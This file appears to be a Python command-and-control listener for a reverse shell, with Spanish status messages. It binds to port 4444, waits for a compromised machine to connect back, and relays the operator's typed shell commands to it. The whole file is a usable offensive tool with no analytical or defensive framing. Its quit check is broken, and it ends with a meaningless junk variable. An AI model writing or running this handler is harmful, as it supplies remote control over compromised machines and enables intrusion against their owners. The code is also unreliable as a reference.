import socket

ip = "192.168.0.207"
port = 4444

class Listener:
    def __init__(self):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(10)

    def aceptar(self):
        print("[+] Esperando por conexiones")
        conn, addr = self.listener.accept()
        print("[+] Tenemos una conexion de " + str(addr))
        self.comandos(conn)
        conn.close()

    def comandos(self, conn):
        while True:
            cmd = input(">>")

            if str.encode(cmd) == "q":break

            if len(str.encode(cmd)) > 0:

                conn.send(str.encode(cmd))
                respuesta = str(conn.recv(1024))
                print(respuesta)
                
escuchar = Listener()
escuchar.aceptar()

vkdsvdscds = "mlvdsvlskpds"